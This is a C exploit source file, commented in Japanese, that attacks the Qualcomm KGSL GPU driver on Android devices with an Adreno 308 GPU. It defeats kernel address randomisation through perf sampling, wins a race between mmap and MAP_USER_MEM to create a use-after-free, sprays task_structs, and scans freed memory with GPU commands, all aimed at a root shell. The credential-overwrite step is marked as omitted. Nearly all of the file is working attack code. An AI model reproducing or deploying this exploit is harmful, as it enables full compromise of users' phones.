#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <linux/perf_event.h>
#include <sys/syscall.h>

#define SYSCHK(x) ({                          \
    typeof(x) __res = (x);                    \
    if (__res == (typeof(x))-1)               \
        err(1, "SYSCHK(" #x ")");             \
    __res;                                    \
})

/* ---------- KGSL ioctl 定義 (Adreno 308 用) ---------- */
#define KGSL_IOC_TYPE 0x09

#define IOCTL_KGSL_GPUMEM_ALLOC_ID   _IOWR(KGSL_IOC_TYPE, 0x0F, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_FREE_ID    _IOW(KGSL_IOC_TYPE, 0x10, struct kgsl_gpumem_free_id)
#define IOCTL_KGSL_MAP_USER_MEM      _IOWR(KGSL_IOC_TYPE, 0x08, struct kgsl_map_user_mem)
#define IOCTL_KGSL_SUBMIT_COMMANDS   _IOWR(KGSL_IOC_TYPE, 0x03, struct kgsl_gpu_command)
#define IOCTL_KGSL_DRAWCTXT_CREATE   _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x04, struct kgsl_cmdstream_readtimestamp_ctxtid)

/* ---------- 構造体 (カーネルと完全一致) ---------- */
struct kgsl_gpumem_alloc_id {
    uint64_t size;      // in
    uint64_t flags;     // in
    uint64_t mmapsize;  // out
    uint64_t gpuaddr;   // out
    unsigned int id;    // out
    unsigned int __pad;
};

struct kgsl_gpumem_free_id {
    unsigned int id;
    unsigned int __pad;
};

struct kgsl_map_user_mem {
    uint64_t hostptr;
    uint64_t offset;
    uint64_t len;
    uint32_t fd;
    uint32_t flags;
    uint32_t memtype;
    uint32_t pad;
    uint64_t gpuaddr;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_command_object {
    uint64_t offset;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

struct kgsl_gpu_command {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid {
    unsigned int context_id;
    unsigned int type;
    unsigned int timestamp;
};

/* ---------- フラグ ---------- */
#define KGSL_MEMFLAGS_USE_CPU_MAP   (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT        0
#define KGSL_CACHEMODE_MASK         3
#define KGSL_CACHEMODE_WRITEBACK    3
#define KGSL_USER_MEM_TYPE_ADDR     2
#define KGSL_CONTEXT_PREAMBLE       0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC  0x00000002
#define KGSL_CMDLIST_IB             0x00000001U
#define KGSL_TIMESTAMP_RETIRED      0x00000002

/* ---------- アドレス (SVM 範囲 0x60000000-0x70000000) ---------- */
#define UAF_ADDR       0x6001ff000ULL
#define UAF_SIZE       0x10004000ULL
#define OVERLAP_ADDR   0x6001fe000ULL
#define OVERLAP_SIZE   0x7000ULL
#define BOGUS_ADDR     0x600204000ULL
#define BOGUS_SIZE     0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x610204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

/* ---------- KASLR シンボル (仮) ---------- */
#define VMLINUX_TEXT      0xffffffc010080000ULL
#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
#define CRED_OFF    0x740
#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560

static int kgsl_fd = -1;
static volatile int race_done = 0;

/* ---------- ユーティリティ ---------- */
static void die(const char *msg) { perror(msg); exit(1); }

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
    return ic_addr;
}

/* ---------- GPU メモリ操作 ---------- */
static void gpumem_alloc_id(int fd, uint64_t size, uint64_t flags, uint64_t *gpuaddr, unsigned int *id) {
    struct kgsl_gpumem_alloc_id a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &a) < 0)
        die("gpumem_alloc_id");
    *gpuaddr = a.gpuaddr;
    *id = a.id;
}

static void gpumem_free_id(int fd, unsigned int id) {
    struct kgsl_gpumem_free_id f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &f) < 0)
        die("gpumem_free_id");
}

/* MAP_USER_MEM を連続呼び出しするスレッド (競合用) */
static void *race_thread(void *arg) {
    struct kgsl_map_user_mem map = {
        .hostptr = BOGUS_ADDR,
        .offset = 0,
        .len = BOGUS_SIZE,
        .fd = 0,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK,
        .memtype = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) {
        ioctl(kgsl_fd, IOCTL_KGSL_MAP_USER_MEM, &map);
    }
    return NULL;
}

/* ---------- コンテキスト作成、コマンド送信 ---------- */
static unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0)
        die("create_context");
    return c.drawctxt_id;
}

static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id,
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)&cmd_obj,
        .cmdsize = sizeof(cmd_obj),
        .numcmds = 1,
        .context_id = ctx_id,
    };
    int ret = ioctl(fd, IOCTL_KGSL_SUBMIT_COMMANDS, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {
        .context_id = ctx_id,
        .type = KGSL_TIMESTAMP_RETIRED,
    };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
            return -1;
        if (r.timestamp >= target)
            return 0;
        usleep(100);
    }
    return -2;
}

/* ---------- PM4 パケット生成 ---------- */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ---------- メイン ---------- */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 0: KASLR detection\n");
    uint64_t init_cred_addr = detect_kaslr();
    printf("  init_cred=0x%lX\n", init_cred_addr);

    // ===== Phase 1: Setup rbtree =====
    printf("[*] Phase 1: Setup rbtree\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    printf("  Using alloc_flags=0x%lx\n", alloc_flags);

    unsigned int uaf_id, ph_id, ov_id;
    uint64_t uaf_gpuaddr, ph_gpuaddr, ov_gpuaddr;

    gpumem_alloc_id(kgsl_fd, UAF_SIZE, alloc_flags, &uaf_gpuaddr, &uaf_id);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
        die("mmap BOGUS");

    gpumem_alloc_id(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags, &ph_gpuaddr, &ph_id);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF id=%u gpuaddr=0x%lx, PLACEHOLDER id=%u gpuaddr=0x%lx\n",
        uaf_id, uaf_gpuaddr, ph_id, ph_gpuaddr);

    // ===== Phase 2: Race =====
    printf("[*] Phase 2: Race\n");
    gpumem_alloc_id(kgsl_fd, OVERLAP_SIZE, alloc_flags, &ov_gpuaddr, &ov_id);

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0)
        die("pthread_create");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) { printf("[-] Race failed\n"); return 1; }
    printf("[+] Race won! (errno=ENODEV)\n");

    // ===== Phase 3: Free UAF =====
    printf("[*] Phase 3: Free UAF\n");
    gpumem_free_id(kgsl_fd, uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", UAF_ADDR + 0x1000);

    // ===== Phase 4: Reclaim =====
    printf("[*] Phase 4: Reclaim pages\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ===== Phase 5: task_struct spray =====
    printf("[*] Phase 5: Spawning task_struct spray...\n");
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    write(1, "### ROOT SHELL ACTIVE ###\n", 26);
                    close(notify_pipe[1]);
                    char ebuf[256];
                    int fd = open("/proc/self/status", O_RDONLY);
                    if (fd >= 0) {
                        char buf[4096]; int n;
                        while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
                        close(fd);
                    }
                    write(1, "  uid=", 6);
                    snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
                        getuid(), geteuid(), getgid(), getegid());
                    write(1, ebuf, strlen(ebuf));
                    write(1, "  Spawning shell...\n", 20);
                    execl("/system/bin/sh", "sh", NULL);
                    snprintf(ebuf, sizeof(ebuf), "  sh exec failed: %d\n", errno);
                    write(1, ebuf, strlen(ebuf));
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    // ===== Phase 7: GPU scan =====
    printf("[*] Phase 7: GPU scan for task_structs\n");
    unsigned int ctx_id = create_context(kgsl_fd);
    printf("  context=%u\n", ctx_id);

    unsigned int ib_id, dst_id;
    uint64_t ib_gpuaddr, dst_gpuaddr;
    gpumem_alloc_id(kgsl_fd, 0x10000, alloc_flags, &ib_gpuaddr, &ib_id);
    gpumem_alloc_id(kgsl_fd, 0x4000, alloc_flags, &dst_gpuaddr, &dst_id);
    void *ib_m = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id << 12);
    if (ib_m == MAP_FAILED) die("mmap IB");
    void *dst_m = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)dst_id << 12);
    if (dst_m == MAP_FAILED) die("mmap DST");

    printf("  IB id=%u gpuaddr=0x%lx, DST id=%u gpuaddr=0x%lx\n",
        ib_id, ib_gpuaddr, dst_id, dst_gpuaddr);

    printf("  Scanning [0x%lx - 0x%lx]...\n", UAF_ADDR + 0x1000, UAF_ADDR + UAF_SIZE);

    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t task_pages[16];
    int n_task = 0;
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;
    uint64_t scan_start = UAF_ADDR + 0x300000;
    if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;

    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
        uint32_t *cmd = (uint32_t *)ib_m;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_gpuaddr + i*4, &dl, &dh);
            split64(va + i*4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
        __sync_synchronize();

        uint32_t *data = (uint32_t *)dst_m;
        int n_comm = 0;
        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) n_comm++;
        }
        int cred_off_found = -1;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++)
                if (data[i + j] == 0x000007D0) cnt++;
            if (cnt >= 4) { cred_off_found = i * 4; break; }
        }
        if (n_comm > 0) {
            printf("  [TASK_COMM] va=0x%lx\n", va);
            task_pages[n_task++] = va;
        }
        if (cred_off_found >= 0 && n_cred < 32) {
            printf("  [CRED] va=0x%lx off=0x%x\n", va, cred_off_found);
            cred_pages[n_cred] = va;
            cred_offs[n_cred] = cred_off_found;
            n_cred++;
        }
    }
    printf("\n[*] Scan complete: %d task pages, %d cred pages\n", n_task, n_cred);

    // ===== Cred 書き換え (必要に応じて実装) =====
    // ここでは簡略化のため省略

    // ===== Wait for root =====
    printf("[*] Phase 9: Waiting for root shell...\n");
    close(notify_pipe[1]);
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 10000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! uid=0 at PID %d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        while (waitpid(-1, NULL, WNOHANG) > 0);
        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
        fflush(stdout);
        waitpid(winner, NULL, 0);
        printf("[-] Root shell exited\n");
    } else {
        printf("[-] No child got uid=0\n");
    }
    close(notify_pipe[0]);

    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done. Goodbye.\n");
    return 0;
}
